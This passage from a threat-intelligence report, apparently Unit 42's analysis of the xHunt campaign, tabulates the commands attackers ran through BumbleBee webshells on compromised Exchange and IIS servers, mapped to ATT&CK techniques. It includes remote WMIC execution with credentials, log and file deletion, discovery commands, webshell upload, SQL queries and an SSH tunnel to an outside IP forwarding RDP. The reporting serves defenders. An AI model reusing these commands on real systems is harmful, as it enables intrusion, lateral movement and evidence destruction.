[T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:57:10 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe /F [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:58:00 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c del c:\\windows\\temp\\RTQ.exe /F”\n\n15:58:05 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c del c:\\windows\\temp\\RTQ.exe”\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n15:58:19 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:25 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:38 dir \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:43 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:59:25 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c tasklist > C:\\windows\\temp\\r.txt”\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:29 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:59:48 wmic /node:”<redacted IP #3>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c taskkill /IM “RTQ.exe” /F”\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:55 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n15:59:58 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:04 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:09 del \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n16:00:14 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:24 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:29 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:02:48 powershell -c “Test-NetConnection -ComputerName <redacted IP #2> Port 80 -InformationLevel “Detailed”\n\n16:04:36 powershell -c “Test-NetConnection -ComputerName <redacted IP #2> Port 3389 -InformationLevel “Detailed”\n\n16:07:23 powershell -c “Test-NetConnection -ComputerName <redacted IP #2> Port 389 -InformationLevel “Detailed”\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n\n16:07:55 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n16:08:42 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #1>:3389 -l bor -pw 123321 -P 443\n\n16:09:03 wmic /node:”127.0.0.1″ /user:administrator /PASSWORD:”<redacted\npassword #2>” process call create “cmd.exe /c whoami”\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:09:15 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:09:35 wmic /node:”Exchange” /user:administrator /PASSWORD:”<redacted\npassword #2>” process call create “cmd.exe /c whoami”\n\n16:10:35 net use \\<redacted IP #1>\\C$ /user:<redacted domain>\\<redacted\nusername #2> <redacted password #1>\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:10:45 quser /server:<redacted IP #4> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n16:13:17 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:13:27 wmic /node:”<redacted IP #1>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c c:\\windows\\temp\\RTQ.exe whoami”\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:14:20 type \\<redacted IP #1>\\C$\\windows\\temp\\w.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:14:30 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:14:56 wmic /node:”<redacted IP #1>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd.exe /c tasklist > c:\\windows\\temp\\ww.txt”\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n16:15:28 dir \\<redacted IP #1>\\c$\\windows\\temp\\*txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:15:36 type \\<redacted IP #1>\\c$\\windows\\temp\\ww.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:17:54 powershell -c Test-NetConnection -ComputerName <redacted IP #1> Port 3389\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n\n-----\n\n16:19:28 powershell -c Test-NetConnection -ComputerName <redacted IP #2> Port 3389\n\n16:19:32 wmic /node:”<redacted IP #1>” /user:<redacted domain>\\<redacted\nusername #2> /PASSWORD:<redacted password #1> process call\ncreate “cmd /c powershell -c Test-NetConnection -ComputerName\n<redacted IP #2> -Port 3389 > c:\\windows\\temp\\r.txt”\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n16:20:00 type \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:20:34 ping -n 1 -a <redacted IP #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n16:21:29 wmic /node:”<redacted IP #2>” /user:administrator\n/PASSWORD:”<redacted password #2>” process call create “cmd.exe\n/c whoami”\n\n16:22:06 wmic /node:”<redacted IP #2>” /user:administrator\n/PASSWORD:”<redacted password #2>” process call create “cmd.exe\n/c whoami”\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:22:59 net use [T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:07 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:16 type \\<redacted IP #1>\\C$\\windows\\temp\\teredo.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:27 del \\<redacted IP #1>\\C$\\windows\\temp\\ww.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:29 del \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:43 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n17:21:19 del owafont_ja.aspx /F [T1505.003,](https://attack.mitre.org/techniques/T1505/003/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n_Table 2. Commands the actor ran using BumbleBee webshell on the compromised Exchange server._\n\n**Commands Executed via BumbleBee on IIS Web Server**\n\n\n**Time** **Webshell**\n**Filename**\n\n\n**Command** **ATT&CK TIDs**\n\n\n9/10/20\n20:47:36\n\n9/10/20\n20:48:03\n\n9/10/20\n20:48:20\n\n9/10/20\n20:48:29\n\n\nShowDoc.aspx hostname & whoami & ipconfig/all & route print &\narp -a\n\n\n[T1082,](https://attack.mitre.org/techniques/T1082/)\n[T1033,](https://attack.mitre.org/techniques/T1033/)\n\n[T1016](https://attack.mitre.org/techniques/T1016/)\n\n\nShowDoc.aspx ping -n 1 -a <redacted IP> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx ping -n 1 -a <redacted domain> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\n\n-----\n\n9/10/20\n20:48:33\n\n9/10/20\n20:49:19\n\n9/10/20\n20:49:27\n\n9/10/20\n20:49:35\n\n9/10/20\n20:49:44\n\n9/10/20\n20:50:16\n\n9/10/20\n20:50:21\n\n9/10/20\n20:50:40\n\n9/10/20\n20:51:16\n\n9/10/20\n20:51:37\n\n9/10/20\n20:51:45\n\n9/10/20\n20:52:27\n\n\nShowDoc.aspx ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx echo %USERDOMAIN% [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nShowDoc.aspx net users [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\nShowDoc.aspx net localgroup administrators [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\nShowDoc.aspx net view [T1135](https://attack.mitre.org/techniques/T1135/)\n\nShowDoc.aspx type ..\\..\\web.config [T1005](https://attack.mitre.org/techniques/T1005/)\n\nShowDoc.aspx ** Uploads cq.aspx webshell ** [T1505.003](https://attack.mitre.org/techniques/T1505/003/)\n\n\ncq.aspx powershell -C “$conn=new-object\nSystem.Data.SqlClient.SQLConnection(“””<redacted\nSQL connection>”””);Try { $conn.Open(); }Catch {\ncontinue; }$cmd = new-object\nSystem.Data.SqlClient.SqlCommand(“””select\n@@version;”””,$conn);$ds=New-Object\nsystem.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();”\n\ncq.aspx powershell -C “$conn=new-object\nSystem.Data.SqlClient.SQLConnection(“””<redacted\nSQL connection>”””);Try { $conn.Open(); }Catch {\ncontinue; }$cmd = new-object\nSystem.Data.SqlClient.SqlCommand(“””<redacted\nSQL query>”””,$conn);$ds=New-Object\nsystem.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();”\n\ncq.aspx powershell -C “$conn=new-object\nSystem.Data.SqlClient.SQLConnection(“””<redacted\nSQL connection>”””);Try { $conn.Open(); }Catch {\ncontinue; }$cmd = new-object\nSystem.Data.SqlClient.SqlCommand(“””<redacted\nSQL query>”””,$conn);$ds=New-Object\nsystem.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();”\n\n\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1213](https://attack.mitre.org/techniques/T1213/)\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n\nShowDoc.aspx del cq.aspx [T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n_Table 3. Commands the actor ran using BumbleBee webshell hosted at second Kuwaiti organization._\n\n**Get updates from Palo Alto Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n\n-----\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2021.01.11.xHunt_Campaign/unit42.paloaltonetworks.com-xHunt%20Campaign%20New%20BumbleBee%20Webshell%20and%20SSH%20Tunnels%20Used%20for%20Lateral%20Movement.pdf"
    ],
    "report_names": [
        "unit42.paloaltonetworks.com-xHunt Campaign New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement"
    ],
    "threat_actors": [
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1610416750,
    "ts_modification_date": 1610416750,
    "files": {
        "pdf": "https://archive.orkl.eu/61a27be290976447f72c35a58fb1b76481b08adb.pdf",
        "text": "https://archive.orkl.eu/61a27be290976447f72c35a58fb1b76481b08adb.txt",
        "img": "https://archive.orkl.eu/61a27be290976447f72c35a58fb1b76481b08adb.jpg"
    }
}